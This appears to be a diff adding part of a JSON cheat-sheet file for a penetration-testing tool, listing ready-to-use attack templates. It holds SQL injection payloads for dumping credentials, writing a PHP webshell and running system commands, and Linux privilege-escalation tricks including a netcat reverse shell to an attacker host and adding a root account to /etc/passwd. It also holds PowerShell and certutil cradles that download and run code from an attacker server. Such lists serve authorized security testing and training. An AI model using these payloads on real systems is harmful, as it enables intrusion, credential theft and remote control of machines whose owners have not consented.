+        {
+          "section": "Enumerate (MySQL)",
+          "title": "current user/db",
+          "template": "' UNION SELECT current_user(),database()-- -",
+          "desc": "",
+          "note": ""
+        },
+        {
+          "section": "Enumerate (MySQL)",
+          "title": "tables",
+          "template": "' UNION SELECT NULL,table_name FROM information_schema.tables-- -",
+          "desc": "",
+          "note": ""
+        },
+        {
+          "section": "Enumerate (MySQL)",
+          "title": "columns",
+          "template": "' UNION SELECT NULL,column_name FROM information_schema.columns WHERE table_name='users'-- -",
+          "desc": "",
+          "note": ""
+        },
+        {
+          "section": "Enumerate (MySQL)",
+          "title": "dump creds",
+          "template": "' UNION SELECT NULL,concat(user,0x3a,password) FROM users-- -",
+          "desc": "",
+          "note": ""
+        },
+        {
+          "section": "Error-based (MySQL)",
+          "title": "extractvalue",
+          "template": "' AND extractvalue(1,concat(0x7e,version()))-- -",
+          "desc": "",
+          "note": ""
+        },
+        {
+          "section": "Error-based (MySQL)",
+          "title": "updatexml",
+          "template": "' AND updatexml(1,concat(0x7e,(SELECT database())),1)-- -",
+          "desc": "",
+          "note": ""
+        },
+        {
+          "section": "Blind",
+          "title": "boolean true/false",
+          "template": "' AND 1=1-- -   vs   ' AND 1=2-- -",
+          "desc": "compare responses",
+          "note": ""
+        },
+        {
+          "section": "Blind",
+          "title": "time (MySQL)",
+          "template": "' AND SLEEP(5)-- -",
+          "desc": "",
+          "note": ""
+        },
+        {
+          "section": "Blind",
+          "title": "time (MSSQL)",
+          "template": "'; WAITFOR DELAY '0:0:5'-- -",
+          "desc": "",
+          "note": ""
+        },
+        {
+          "section": "Blind",
+          "title": "time (PgSQL)",
+          "template": "' AND (SELECT pg_sleep(5))-- -",
+          "desc": "",
+          "note": ""
+        },
+        {
+          "section": "Files (MySQL)",
+          "title": "read file",
+          "template": "' UNION SELECT LOAD_FILE('/etc/passwd')-- -",
+          "desc": "needs FILE priv",
+          "note": ""
+        },
+        {
+          "section": "Files (MySQL)",
+          "title": "write webshell",
+          "template": "' UNION SELECT '<?php system($_GET[c]);?>' INTO OUTFILE '/var/www/html/s.php'-- -",
+          "desc": "FILE priv + writable",
+          "note": ""
+        },
+        {
+          "section": "RCE (MSSQL)",
+          "title": "xp_cmdshell",
+          "template": "'; EXEC xp_cmdshell 'whoami'-- -",
+          "desc": "enable first if needed",
+          "note": ""
+        },
+        {
+          "section": "RCE (PgSQL)",
+          "title": "COPY FROM PROGRAM",
+          "template": "'; COPY t FROM PROGRAM 'id'-- -",
+          "desc": "superuser",
+          "note": ""
+        }
+      ]
+    },
+    {
+      "id": "linux",
+      "name": "Linux enum & privesc",
+      "desc": "Full local-enum command set (HackTools-style).",
+      "needs": [
+        "LHOST",
+        "LPORT"
+      ],
+      "resources": [],
+      "items": [
+        {
+          "section": "SUID / caps",
+          "title": "find root /4000",
+          "template": "find / -user root -perm /4000 2>/dev/null",
+          "desc": "",
+          "note": ""
+        },
+        {
+          "section": "SUID / caps",
+          "title": "find -u=s",
+          "template": "find / -perm -u=s -type f 2>/dev/null",
+          "desc": "",
+          "note": ""
+        },
+        {
+          "section": "SUID / caps",
+          "title": "find -4000",
+          "template": "find / -perm -4000 -type f 2>/dev/null",
+          "desc": "privesc check #1",
+          "note": "oscp gtfo <bin> suid"
+        },
+        {
+          "section": "SUID / caps",
+          "title": "SUID list to file",
+          "template": "find / -user root -perm -4000 -exec ls -ldb {} \\; > /tmp/suid",
+          "desc": "",
+          "note": ""
+        },
+        {
+          "section": "SUID / caps",
+          "title": "capabilities",
+          "template": "getcap -r / 2>/dev/null",
+          "desc": "cap_setuid = root",
+          "note": ""
+        },
+        {
+          "section": "SUID / caps",
+          "title": "sudo rights",
+          "template": "sudo -l",
+          "desc": "",
+          "note": "oscp gtfo <bin> sudo"
+        },
+        {
+          "section": "SUID / caps",
+          "title": "writable files",
+          "template": "find / -writable -type f 2>/dev/null | grep -v /proc",
+          "desc": "",
+          "note": ""
+        },
+        {
+          "section": "OS version",
+          "title": "issue",
+          "template": "cat /etc/issue",
+          "desc": "",
+          "note": ""
+        },
+        {
+          "section": "OS version",
+          "title": "release",
+          "template": "cat /etc/*-release",
+          "desc": "",
+          "note": ""
+        },
+        {
+          "section": "OS version",
+          "title": "lsb",
+          "template": "cat /etc/lsb-release",
+          "desc": "",
+          "note": ""
+        },
+        {
+          "section": "OS version",
+          "title": "redhat",
+          "template": "cat /etc/redhat-release",
+          "desc": "",
+          "note": ""
+        },
+        {
+          "section": "Kernel",
+          "title": "proc version",
+          "template": "cat /proc/version",
+          "desc": "",
+          "note": ""
+        },
+        {
+          "section": "Kernel",
+          "title": "uname -a",
+          "template": "uname -a",
+          "desc": "",
+          "note": ""
+        },
+        {
+          "section": "Kernel",
+          "title": "uname -mrs",
+          "template": "uname -mrs",
+          "desc": "",
+          "note": ""
+        },
+        {
+          "section": "Kernel",
+          "title": "rpm kernel",
+          "template": "rpm -q kernel",
+          "desc": "",
+          "note": ""
+        },
+        {
+          "section": "Kernel",
+          "title": "dmesg",
+          "template": "dmesg | grep Linux",
+          "desc": "",
+          "note": ""
+        },
+        {
+          "section": "Kernel",
+          "title": "boot vmlinuz",
+          "template": "ls /boot | grep vmlinuz",
+          "desc": "",
+          "note": ""
+        },
+        {
+          "section": "Environment",
+          "title": "profile",
+          "template": "cat /etc/profile",
+          "desc": "",
+          "note": ""
+        },
+        {
+          "section": "Environment",
+          "title": "bashrc",
+          "template": "cat /etc/bashrc; cat ~/.bashrc",
+          "desc": "",
+          "note": ""
+        },
+        {
+          "section": "Environment",
+          "title": "bash_profile",
+          "template": "cat ~/.bash_profile",
+          "desc": "",
+          "note": ""
+        },
+        {
+          "section": "Environment",
+          "title": "env",
+          "template": "env",
+          "desc": "",
+          "note": ""
+        },
+        {
+          "section": "Environment",
+          "title": "set",
+          "template": "set",
+          "desc": "",
+          "note": ""
+        },
+        {
+          "section": "Services config",
+          "title": "apache2",
+          "template": "cat /etc/apache2/apache2.conf",
+          "desc": "",
+          "note": ""
+        },
+        {
+          "section": "Services config",
+          "title": "httpd",
+          "template": "cat /etc/httpd/conf/httpd.conf",
+          "desc": "",
+          "note": ""
+        },
+        {
+          "section": "Services config",
+          "title": "mysql",
+          "template": "cat /etc/my.cnf",
+          "desc": "",
+          "note": ""
+        },
+        {
+          "section": "Services config",
+          "title": "inetd",
+          "template": "cat /etc/inetd.conf",
+          "desc": "",
+          "note": ""
+        },
+        {
+          "section": "Services config",
+          "title": "lighttpd",
+          "template": "cat /etc/lighttpd.conf",
+          "desc": "",
+          "note": ""
+        },
+        {
+          "section": "Services config",
+          "title": "cups",
+          "template": "cat /etc/cups/cupsd.conf",
+          "desc": "",
+          "note": ""
+        },
+        {
+          "section": "Services config",
+          "title": "writable in /etc",
+          "template": "ls -aRl /etc/ 2>/dev/null | awk '$1 ~ /w.$/' | grep -v total",
+          "desc": "",
+          "note": ""
+        },
+        {
+          "section": "Cron",
+          "title": "crontab -l",
+          "template": "crontab -l",
+          "desc": "",
+          "note": ""
+        },
+        {
+          "section": "Cron",
+          "title": "spool cron",
+          "template": "ls -alh /var/spool/cron",
+          "desc": "",
+          "note": ""
+        },
+        {
+          "section": "Cron",
+          "title": "etc cron*",
+          "template": "ls -al /etc/cron* ; cat /etc/cron*",
+          "desc": "",
+          "note": ""
+        },
+        {
+          "section": "Cron",
+          "title": "crontab file",
+          "template": "cat /etc/crontab",
+          "desc": "",
+          "note": "watch with pspy"
+        },
+        {
+          "section": "Cron",
+          "title": "anacrontab",
+          "template": "cat /etc/anacrontab",
+          "desc": "",
+          "note": ""
+        },
+        {
+          "section": "Cron",
+          "title": "cron allow/deny",
+          "template": "cat /etc/cron.allow /etc/cron.deny /etc/at.allow /etc/at.deny 2>/dev/null",
+          "desc": "",
+          "note": ""
+        },
+        {
+          "section": "Network / users",
+          "title": "lsof",
+          "template": "lsof -i",
+          "desc": "",
+          "note": ""
+        },
+        {
+          "section": "Network / users",
+          "title": "netstat",
+          "template": "netstat -antup; netstat -tulpn",
+          "desc": "",
+          "note": ""
+        },
+        {
+          "section": "Network / users",
+          "title": "ss",
+          "template": "ss -tlnp",
+          "desc": "modern",
+          "note": ""
+        },
+        {
+          "section": "Network / users",
+          "title": "last/lastlog",
+          "template": "last; lastlog",
+          "desc": "",
+          "note": ""
+        },
+        {
+          "section": "Network / users",
+          "title": "who/id",
+          "template": "w; id; cat /etc/passwd; cat /etc/group",
+          "desc": "",
+          "note": ""
+        },
+        {
+          "section": "Network / users",
+          "title": "grep creds",
+          "template": "grep -rniE 'password|secret|api[_-]?key' /etc /var/www 2>/dev/null",
+          "desc": "",
+          "note": ""
+        },
+        {
+          "section": "Port forwarding",
+          "title": "ssh -L (local)",
+          "template": "ssh -L 8080:127.0.0.1:80 user@{LHOST}",
+          "desc": "reach remote svc",
+          "note": ""
+        },
+        {
+          "section": "Port forwarding",
+          "title": "ssh -R (remote)",
+          "template": "ssh -R 8080:127.0.0.1:80 user@{LHOST}",
+          "desc": "expose your port",
+          "note": ""
+        },
+        {
+          "section": "Port forwarding",
+          "title": "ssh -D (socks)",
+          "template": "ssh -D 1080 user@{LHOST}",
+          "desc": "proxychains",
+          "note": ""
+        },
+        {
+          "section": "Port forwarding",
+          "title": "nc relay (mknod)",
+          "template": "mknod backpipe p; nc -l -p 8080 0<backpipe | nc {LHOST} 80 1>backpipe",
+          "desc": "port relay",
+          "note": ""
+        },
+        {
+          "section": "Privesc tricks",
+          "title": "tar wildcard (1)",
+          "template": "echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {LHOST} {LPORT} >/tmp/f' > shell.sh",
+          "desc": "in a dir a root tar * runs",
+          "note": "see: oscp manual show wildcards-globbing"
+        },
+        {
+          "section": "Privesc tricks",
+          "title": "tar wildcard (2)",
+          "template": "touch -- '--checkpoint-action=exec=sh shell.sh'; touch -- '--checkpoint=1'",
+          "desc": "",
+          "note": ""
+        },
+        {
+          "section": "Privesc tricks",
+          "title": "writable passwd root user",
+          "template": "echo 'r00t:$(openssl passwd -1 pass):0:0::/root:/bin/bash' >> /etc/passwd",
+          "desc": "if /etc/passwd writable",
+          "note": ""
+        },
+        {
+          "section": "Privesc tricks",
+          "title": "LD_PRELOAD (sudo)",
+          "template": "gcc -fPIC -shared -o /tmp/x.so -xc - <<<'#include <stdlib.h>\\n__attribute__((constructor)) void i(){setuid(0);system(\"/bin/bash -p\");}'; sudo LD_PRELOAD=/tmp/x.so <allowed-cmd>",
+          "desc": "if env_keep+=LD_PRELOAD",
+          "note": ""
+        }
+      ]
+    },
+    {
+      "id": "windows",
+      "name": "Windows / PowerShell enum",
+      "desc": "PowerShell handy commands (HackTools-style).",
+      "needs": [
+        "LHOST",
+        "LPORT"
+      ],
+      "resources": [],
+      "items": [
+        {
+          "section": "System enum",
+          "title": "systeminfo",
+          "template": "systeminfo",
+          "desc": "OS/patch",
+          "note": ""
+        },
+        {
+          "section": "System enum",
+          "title": "computer system",
+          "template": "Get-WmiObject Win32_ComputerSystem",
+          "desc": "",
+          "note": ""
+        },
+        {
+          "section": "System enum",
+          "title": "domain",
+          "template": "echo \"$env:COMPUTERNAME.$env:USERDNSDOMAIN\"",
+          "desc": "",
+          "note": ""
+        },
+        {
+          "section": "System enum",
+          "title": "os version",
+          "template": "[System.Environment]::OSVersion.Version",
+          "desc": "",
+          "note": ""
+        },
+        {
+          "section": "Patches",
+          "title": "hotfix",
+          "template": "Get-Hotfix",
+          "desc": "",
+          "note": ""
+        },
+        {
+          "section": "Patches",
+          "title": "security updates",
+          "template": "Get-Hotfix -Description \"Security update\"",
+          "desc": "",
+          "note": ""
+        },
+        {
+          "section": "Patches",
+          "title": "wmic qfe",
+          "template": "wmic qfe get HotFixID,InstalledOn",
+          "desc": "",
+          "note": ""
+        },
+        {
+          "section": "Environment",
+          "title": "env",
+          "template": "Get-ChildItem Env: | ft Key,Value",
+          "desc": "",
+          "note": ""
+        },
+        {
+          "section": "Environment",
+          "title": "path",
+          "template": "echo %PATH%",
+          "desc": "cmd",
+          "note": ""
+        },
+        {
+          "section": "Users / groups",
+          "title": "my privileges",
+          "template": "whoami /priv",
+          "desc": "SeImpersonate -> Potato",
+          "note": ""
+        },
+        {
+          "section": "Users / groups",
+          "title": "my groups",
+          "template": "whoami /groups",
+          "desc": "",
+          "note": ""
+        },
+        {
+          "section": "Users / groups",
+          "title": "local users",
+          "template": "net user; Get-LocalUser",
+          "desc": "",
+          "note": ""
+        },
+        {
+          "section": "Users / groups",
+          "title": "admins",
+          "template": "net localgroup administrators; Get-LocalGroupMember Administrators",
+          "desc": "",
+          "note": ""
+        },
+        {
+          "section": "Users / groups",
+          "title": "logged on",
+          "template": "query user",
+          "desc": "",
+          "note": ""
+        },
+        {
+          "section": "Network",
+          "title": "ipconfig",
+          "template": "ipconfig /all",
+          "desc": "",
+          "note": ""
+        },
+        {
+          "section": "Network",
+          "title": "routes/arp",
+          "template": "route print; arp -a",
+          "desc": "",
+          "note": ""
+        },
+        {
+          "section": "Network",
+          "title": "connections",
+          "template": "netstat -ano; Get-NetTCPConnection -State Listen",
+          "desc": "",
+          "note": ""
+        },
+        {
+          "section": "Services / tasks",
+          "title": "services",
+          "template": "wmic service get name,displayname,pathname,startmode | findstr /i /v \"C:\\Windows\"",
+          "desc": "unquoted?",
+          "note": ""
+        },
+        {
+          "section": "Services / tasks",
+          "title": "service config",
+          "template": "sc qc <service>",
+          "desc": "",
+          "note": ""
+        },
+        {
+          "section": "Services / tasks",
+          "title": "scheduled tasks",
+          "template": "schtasks /query /fo LIST /v",
+          "desc": "",
+          "note": ""
+        },
+        {
+          "section": "Privesc checks",
+          "title": "AlwaysInstallElevated (HKLM)",
+          "template": "reg query HKLM\\Software\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated",
+          "desc": "",
+          "note": ""
+        },
+        {
+          "section": "Privesc checks",
+          "title": "AlwaysInstallElevated (HKCU)",
+          "template": "reg query HKCU\\Software\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated",
+          "desc": "both =1 -> msi as SYSTEM",
+          "note": ""
+        },
+        {
+          "section": "Privesc checks",
+          "title": "search creds in reg",
+          "template": "reg query HKLM /f password /t REG_SZ /s",
+          "desc": "",
+          "note": ""
+        },
+        {
+          "section": "Privesc checks",
+          "title": "winlogon autologon",
+          "template": "reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\"",
+          "desc": "",
+          "note": ""
+        },
+        {
+          "section": "Download cradles",
+          "title": "DownloadString|iex",
+          "template": "powershell -nop -c \"IEX(New-Object Net.WebClient).DownloadString('http://{LHOST}:{LPORT}/x.ps1')\"",
+          "desc": "in-memory",
+          "note": ""
+        },
+        {
+          "section": "Download cradles",
+          "title": "iwr|iex",
+          "template": "iwr http://{LHOST}:{LPORT}/x.ps1 -UseBasicParsing | iex",
+          "desc": "",
+          "note": ""
+        },
+        {
+          "section": "Download cradles",
+          "title": "certutil",
+          "template": "certutil -urlcache -f http://{LHOST}:{LPORT}/nc.exe nc.exe",
+          "desc": "",
+          "note": ""
+        },
+        {
+          "section": "AV / firewall",
+          "title": "defender status",
+          "template": "Get-MpComputerStatus",
+          "desc": "",
+          "note": ""
+        },
+        {
+          "section": "AV / firewall",
+          "title": "firewall",
+          "template": "netsh advfirewall show allprofiles",
+          "desc": "",
+          "note": ""
+        }
+      ]
+    }
+  ]
+}
